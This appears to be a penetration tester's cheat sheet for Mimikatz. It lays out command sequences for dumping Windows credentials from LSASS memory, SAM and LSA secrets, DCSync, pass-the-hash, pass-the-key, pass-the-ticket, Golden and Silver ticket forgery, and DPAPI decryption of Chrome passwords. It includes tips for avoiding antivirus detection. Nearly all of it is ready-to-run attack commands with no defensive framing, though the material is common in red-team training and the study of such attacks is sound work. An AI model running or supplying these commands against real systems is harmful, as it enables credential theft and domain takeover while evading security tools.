+++
title = "Mimikatz"
+++

- Ref: https://tools.thehacker.recipes/mimikatz/modules

Mimikatz is a post-exploitation tool that can extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, and build Golden Tickets.

## TL;DR Credential Dumping Checklist

```bash
privilege::debug
token::elevate
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::ekeys
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::lsa /patch
```

## Important Notes

- **Debug Privilege**: Most Mimikatz operations require `privilege::debug` to access LSASS memory
- **Administrator Required**: Mimikatz typically needs administrator privileges to function
- **LSASS Access**: Many operations read from LSASS memory, which is protected by Windows
- **Detection**: Mimikatz is heavily flagged by security products and EDR solutions
- **Pass the Hash**: When using `sekurlsa::pth`, a new window will open - run commands in that new window
- **Golden Tickets**: Golden Tickets are valid until the KRBTGT account password is changed (typically 180 days by default)
- **Ticket Files**: Exported Kerberos tickets use `.kirbi` format
- **Domain Syntax**: Use "." for domain when targeting local machine accounts

## Basic Usage & Privilege Escalation

```bash
# Launch Mimikatz (via SMB share)
\\tsclient\share\mimikatz.exe

# Enable debug privilege (required for most operations)
privilege::debug

# Elevate token to SYSTEM
token::elevate

# Write to console in bae64 (avoid AV flagging)
base64 /out:true

# Write output to a logfile (flagged by AV!)
log <LOGFILE>.txt 
```

## Credential Dumping

### LSASS Memory (sekurlsa)

**Dump All Credentials:**
```bash
# VERBOSE: Dumps credentials from all providers (Kerberos, WDigest, MSV, etc.)
sekurlsa::logonpasswords
```

**Dump WDigest Plaintext Credentials:**
```bash
# Plaintext creds if WDigest is enabled (older systems or manually enabled)
sekurlsa::wdigest
```

**Dump Specific Hash Types:**
```bash
# Dumps only LM/NTLM hashes
sekurlsa::msv
```

**Export Kerberos Tickets:**
```bash
# Avoid AV flagging
base64 /out:true

# Export Kerberos Tickets (TGT/TGS) to disk
sekurlsa::tickets /export
# $ : machine tickets (computers)
# @ : service tickets (users)
```

**Extract AES Keys:**
```bash
# Extract AES Keys for Pass the Key attacks
sekurlsa::ekeys
```

### SAM Database

```bash
# Dumps local SAM database (local user hashes)
lsadump::sam
```

### LSA Secrets

```bash
# Patches LSASS to dump LSA policy data/hashes
lsadump::lsa /patch
```

```bash
# Dumps LSA secrets from registry (autologon, service account passwords, etc.)
lsadump::secrets
```

```bash
# Dumps cached domain logon hashes (DCC2)
lsadump::cache
```

**Dump Specific Account:**
```bash
# Dump specific account (e.g., KRBTGT for Golden Ticket)
lsadump::lsa /inject /name:krbtgt
```

## DCSync

Might require `runas`.

```bash
# Specific user
lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USER>

# For KRBTGT
lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\krbtgt

# All users
# WARNING: takes a long time... write output to a file!
log dc_sync.txt
lsadump::dcsync /domain:<DOMAIN> /all
```

## Pass the Hash (PtH)

Pass the Hash allows you to authenticate using an NTLM hash instead of a plaintext password.

```bash
# Use "." for domain if targeting local machine
# IMPORTANT: Run commands inside the NEW window that pops up
sekurlsa::pth /user:<USER> /ntlm:<PASS_HASH> /domain:<DOMAIN> /run:cmd.exe
```

**Alternative Syntax:**
```bash
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH> /run:cmd.exe
```

## Pass the Key (PtK) / OverPass the Hash (OtH)

*Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*

**Extract AES Keys First:**
```bash
sekurlsa::ekeys
```

**Pass the Key with AES:**
```bash
# Spawns a process. Windows will implicitly request TGT using the injected key/hash when network resources are accessed.
# Can use /ntlm, /aes128, or /aes256
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /run:cmd.exe
```

## Pass the Ticket (PtT)

Pass the Ticket allows you to use stolen Kerberos tickets to authenticate as another user.

**Export Tickets:**
```bash
# Export tickets from memory to .kirbi files
sekurlsa::tickets /export
```

**Inject Ticket:**
```bash
# Inject ticket into current session
kerberos::ptt <TICKET_FILE.kirbi>
misc::cmd
exit
```

## Golden & Silver Ticket Attack

A **Golden Ticket** is a forged Kerberos TGT that allows you to impersonate any user in the domain, including domain administrators.

A **Silver Ticket** is a forged Kerberos TGS that allows you to impersonate any user on a single machine.

### Step 1: Get KRBTGT Hash & SID

**Method A (On DC):**
```bash
lsadump::lsa /inject /name:krbtgt
```

**Method B (Remote DCSync):**
```bash
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

### Step 2: Create & Inject Ticket

- `/ptt` - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
- `/endin` - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  
- `/renewmax` - The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
- `/user`: can use any value including non-existent users

```bash
# GOLDEN TICKET
kerberos::golden /ptt /id:500 /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM>

# SILVER TICKET
kerberos::golden /ptt /id:500 /user:Administrator /domain:<DOMAIN> /sid:<SID> /service:cifs /target:<MACHINE_FQDN> /rc4:<MACHINE_HASH> 
```

### Step 3: Launch Shell

```bash
# OPTIONAL: Launch shell or exit and use the current shell since /ptt was used
misc::cmd  # this only works via RDP
exit

# Verify ticket is working by reading DC share
dir \\<DC_FQDN>\c$\
```

## Credential Manager

Dump credentials stored in Windows Credential Manager:

```bash
sekurlsa::credman
```

## DPAPI (Data Protection API)

Decrypt data protected by Windows DPAPI, such as browser credentials:

```bash
dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```
